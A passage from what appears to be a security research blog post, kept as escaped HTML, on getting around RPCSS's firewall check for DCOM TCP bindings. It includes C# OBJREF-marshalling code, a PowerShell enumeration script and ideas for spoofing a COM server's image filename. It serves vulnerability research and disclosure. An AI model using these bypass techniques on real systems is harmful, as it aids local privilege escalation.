class=\"c6\"&gt;[] ba = GetMarshalledObject(new object());&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;std = COMObjRefStandard.FromArray(ba);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;IPID: {0}&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;, std.Ipid);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;OXID: {0:X08}&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;, std.Oxid);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;OID : {0:X08}&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;, std.Oid);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;std.StringBindings.Clear();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;std.StringBindings.Add(RpcTowerId.Tcp, &lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;$&amp;quot;objref:&lt;/span&gt;&lt;span class=\"c12\"&gt;{0}&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;:&amp;quot;&lt;/span&gt;&lt;span class=\"c12\"&gt;, Convert.ToBase64String(std.ToArray());&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This code creates a basic .NET object and COM marshals it to a standard OBJREF. I&amp;#39;ve left out the code for the marshalling and parsing of the OBJREF, but much of that is already present in the linked &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=325\"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;. We then modify the list of string bindings to only include a TCP binding for 127.0.0.1, forcing the OXID resolver to use TCP. If you specify a computer&amp;#39;s hostname then the OXID resolver will use ALPC instead. Note that the string bindings in the OBJREF are only for binding to the OXID resolver, not the COM server itself.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;We can then convert the modified OBJREF into an &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-createobjrefmoniker\"&gt;objref moniker&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This &lt;/span&gt;&lt;span&gt;format is useful as it allows us to trivially unmarshal the object in another process by calling the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.bindtomoniker\"&gt;Marshal::BindToMoniker&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;API in .NET and passing the moniker string. For example to bind to the COM object in PowerShell you can run the following command:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.aa280acd79392ba85d8386c23bd09616ceb0921a\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c7\"&gt;[&lt;/span&gt;&lt;span class=\"c12 c24\"&gt;Runtime.InteropServices.Marshal&lt;/span&gt;&lt;span class=\"c7\"&gt;]::&lt;/span&gt;&lt;span class=\"c12\"&gt;BindToMoniker(&lt;/span&gt;&lt;span class=\"c12 c14\"&gt;&amp;quot;objref:TUVP...:&amp;quot;&lt;/span&gt;&lt;span class=\"c12\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Immediately after binding to the moniker a firewall dialog is likely to appear as shown:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c5\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5k-8HEb-Iw-6zAMqoicT-dV3S7M6SoG2KtLaksWCOLvt3PYRSsV0n3jLa4pjb9NgoJ0HuTOslYPUbVO0hi-Nnf5gIWEfp7Hqy8aa8YwGhnjUs-slWihaWlPPCMOSny-31V-6hyRNQwi78Ddh1Y-T2187oK3KWEvRdGXsLqsjaXFTRGZbNET_8-Dgi/s790/image4%20%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5k-8HEb-Iw-6zAMqoicT-dV3S7M6SoG2KtLaksWCOLvt3PYRSsV0n3jLa4pjb9NgoJ0HuTOslYPUbVO0hi-Nnf5gIWEfp7Hqy8aa8YwGhnjUs-slWihaWlPPCMOSny-31V-6hyRNQwi78Ddh1Y-T2187oK3KWEvRdGXsLqsjaXFTRGZbNET_8-Dgi/s790/image4%20%283%29.png\" border=\"0\" alt=\"Firewall dialog for the COM server when a TCP binding is created\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;This is requesting the user to allow our COM server process access to listen on all network interfaces for incoming connections. This prompt only appears when the client tries to resolve the OXID as DCOM supports dynamic RPC endpoints. Initially when the COM server starts it only listens on ALPC, but the RPCSS service can ask the server to bind to additional endpoints.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This request is made through an internal RPC interface that every COM server implements for use by the RPCSS service. One of the functions on this interface is &lt;/span&gt;&lt;span class=\"c4\"&gt;UseProtSeq&lt;/span&gt;&lt;span&gt;, which requests that the COM server enables a TCP endpoint. When the COM server receives the &lt;/span&gt;&lt;span class=\"c4\"&gt;UseProtSeq &lt;/span&gt;&lt;span class=\"c9\"&gt;call it tries to bind a TCP server to all interfaces, which subsequently triggers the Windows Defender Firewall to prompt the user for access. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Enabling the firewall permission requires administrator privileges. However, as we only need to listen for connections via localhost we shouldn&amp;#39;t need to modify the firewall so the dialog can be dismissed safely. However, going back to the COM client we&amp;#39;ll see an error reported.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f650b0d01b77aecef2325462507e753c659f0187\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;Exception calling &amp;quot;BindToMoniker&amp;quot; with &amp;quot;1&amp;quot; argument(s): &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;quot;The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;If we allow our COM server executable through the firewall, the client is able to connect over TCP successfully. Clearly the firewall is affecting the behavior of the COM client in some way even though it shouldn&amp;#39;t. Tracing through the unmarshalling process in the COM client, the error is being returned from RPCSS when trying to resolve the OXID&amp;#39;s binding information. This would imply that no connection attempt is made, and RPCSS is detecting that the COM server wouldn&amp;#39;t be allowed through the firewall and refusing to return any binding information for TCP.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Further digging into RPCSS led me to the following function:&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.adfd20381e0d0a060d62f6d9e908c9386f1297f0\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;BOOL IsPortOpen&lt;/span&gt;&lt;span class=\"c3\"&gt;(&lt;/span&gt;&lt;span class=\"c11\"&gt;LPWSTR ImageFileName&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;int&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;PortNumber&lt;/span&gt;&lt;span class=\"c3\"&gt;)&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; INetFwMgr&lt;/span&gt;&lt;span class=\"c3\"&gt;*&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;mgr&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6 c33\"&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; CoCreateInstance&lt;/span&gt;&lt;span class=\"c3\"&gt;(&lt;/span&gt;&lt;span class=\"c11\"&gt;CLSID_FwMgr&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16 c13\"&gt;NULL&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;CLSCTX_INPROC_SERVER&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c6 c33\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;IID_PPV_ARGS&lt;/span&gt;&lt;span class=\"c3\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"c11\"&gt;mgr&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; VARIANT Allowed&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; VARIANT Restricted&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; mgr&lt;/span&gt;&lt;span class=\"c3\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c11\"&gt;IsPortAllowed&lt;/span&gt;&lt;span class=\"c3\"&gt;(&lt;/span&gt;&lt;span class=\"c11\"&gt;ImageFileName&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;NET_FW_IP_VERSION_ANY&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c6 c33\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PortNumber&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16 c13\"&gt;NULL&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;NET_FW_IP_PROTOCOL_TCP&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"c11\"&gt;Allowed&lt;/span&gt;&lt;span class=\"c3\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"c11\"&gt;Restricted&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;(&lt;/span&gt;&lt;span class=\"c11\"&gt;VT_BOOL &lt;/span&gt;&lt;span class=\"c3\"&gt;!=&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;Allowed&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;span class=\"c11\"&gt;vt&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c13 c16\"&gt;return&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c3 c17\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c13\"&gt;return&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;Allowed&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;span class=\"c11\"&gt;boolVal &lt;/span&gt;&lt;span class=\"c3\"&gt;==&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;VARIANT_TRUE&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This function uses the &lt;/span&gt;&lt;span class=\"c4\"&gt;HNetCfg.FwMgr&lt;/span&gt;&lt;span&gt;&amp;nbsp;COM object, and calls &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/netfw/nf-netfw-inetfwmgr-isportallowed\"&gt;INetFwMgr::IsPortAllowed&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;to determine if the process is allowed to listen on the specified TCP port. This function is called for every TCP binding when enumerating the COM server&amp;#39;s bindings to return to the client. RPCSS passes the full path to the COM server&amp;#39;s executable and the listening TCP port. If the function returns FALSE then RPCSS doesn&amp;#39;t consider it valid and won&amp;#39;t add it to the list of potential bindings. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;If the OXID resolving process doesn&amp;#39;t have any binding at the end of the lookup process it will return the &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_S_SERVER_UNAVAILABLE&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;error and the COM client will fail to bind to the server. How can we get around this limitation without needing administrator privileges to allow our server through the firewall? We can convert this C++ code into a small PowerShell function to test the behavior of the function to see what would grant access.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.8dadc02f2dd955da5d84ce378d816be40d1bf022\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c30\"&gt;function&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c28\"&gt;Test-IsPortOpen&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c30\"&gt;param&lt;/span&gt;&lt;span class=\"c6\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c7\"&gt;[&lt;/span&gt;&lt;span class=\"c12 c24\"&gt;string&lt;/span&gt;&lt;span class=\"c7\"&gt;]&lt;/span&gt;&lt;span class=\"c8\"&gt;$Name&lt;/span&gt;&lt;span class=\"c7 c17\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c7\"&gt;[&lt;/span&gt;&lt;span class=\"c12 c24\"&gt;int&lt;/span&gt;&lt;span class=\"c7\"&gt;]&lt;/span&gt;&lt;span class=\"c8 c17\"&gt;$Port&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; )&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c8\"&gt;$mgr&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;=&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;New-Object&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c32\"&gt;-ComObject&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c17 c14\"&gt;&amp;quot;HNetCfg.FwMgr&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c8\"&gt;$allow&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;=&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c8 c17\"&gt;$null&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c8\"&gt;$mgr&lt;/span&gt;&lt;span class=\"c7\"&gt;.&lt;/span&gt;&lt;span class=\"c12\"&gt;IsPortAllowed(&lt;/span&gt;&lt;span class=\"c8\"&gt;$Name&lt;/span&gt;&lt;span class=\"c7\"&gt;,&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c18\"&gt;2&lt;/span&gt;&lt;span class=\"c7\"&gt;,&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c8\"&gt;$Port&lt;/span&gt;&lt;span class=\"c7\"&gt;,&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c14\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"c7\"&gt;,&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c18\"&gt;6&lt;/span&gt;&lt;span class=\"c7\"&gt;,&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;[&lt;/span&gt;&lt;span class=\"c12 c24\"&gt;ref&lt;/span&gt;&lt;span class=\"c7\"&gt;]&lt;/span&gt;&lt;span class=\"c8\"&gt;$allow&lt;/span&gt;&lt;span class=\"c7\"&gt;,&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c8\"&gt;$null&lt;/span&gt;&lt;span class=\"c6\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c8 c17\"&gt;$allow&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c30\"&gt;foreach&lt;/span&gt;&lt;span class=\"c12\"&gt;(&lt;/span&gt;&lt;span class=\"c8\"&gt;$f&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c30\"&gt;in&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;$(&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;ls&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c14\"&gt;&amp;quot;$env:WINDIR\\system32\\*.exe&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;)) { &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c30\"&gt;if&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;Test-IsPortOpen&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c8\"&gt;$f&lt;/span&gt;&lt;span class=\"c7\"&gt;.&lt;/span&gt;&lt;span class=\"c12\"&gt;FullName &lt;/span&gt;&lt;span class=\"c12 c18\"&gt;12345&lt;/span&gt;&lt;span class=\"c6\"&gt;) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;Write-Host&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c8\"&gt;$f&lt;/span&gt;&lt;span class=\"c7\"&gt;.&lt;/span&gt;&lt;span class=\"c6\"&gt;Fullname&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This script enumerates all executable files in system32 and checks if they&amp;#39;d be allowed to connect to TCP port 12345. Normally the TCP port would be selected automatically, however the COM server can use the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep\"&gt;RpcServerUseProtseqEp&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;API to pre-register a known TCP port for RPC communication, so we&amp;#39;ll just pick port 12345.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The only executable in system32 that returns true from &lt;/span&gt;&lt;span class=\"c4\"&gt;Test-IsPortOpen&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=\"c4\"&gt;svchost.exe&lt;/span&gt;&lt;span class=\"c9\"&gt;. That makes some sense, the default firewall rules usually permit a limited number of services to be accessible through the firewall, the majority of which are hosted in a shared service process.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This check doesn&amp;#39;t guarantee a COM server will be allowed through the firewall, just that it&amp;#39;s potentially accessible in order to return a TCP binding string. As the connection will be via localhost we don&amp;#39;t need to be allowed through the firewall, only that &lt;/span&gt;&lt;span class=\"c4\"&gt;IsPortOpen &lt;/span&gt;&lt;span class=\"c9\"&gt;thinks we could be open. How can we spoof the image filename?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The obvious trick would be to create a &lt;/span&gt;&lt;span class=\"c4\"&gt;svchost.exe&lt;/span&gt;&lt;span&gt;&amp;nbsp;process and inject our own code in there. However, that is harder to achieve through pure .NET code and also injecting into an &lt;/span&gt;&lt;span class=\"c4\"&gt;svchost &lt;/span&gt;&lt;span class=\"c9\"&gt;executable is a bit of a red flag if something is monitoring for malicious code which might make the exploit unreliable. Instead, perhaps we can influence the image filename used by RPCSS?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Digging into the COM runtime, when a COM server registers itself with RPCSS it passes its own image filename as part of the registration information. The runtime gets the image filename through a call to &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" 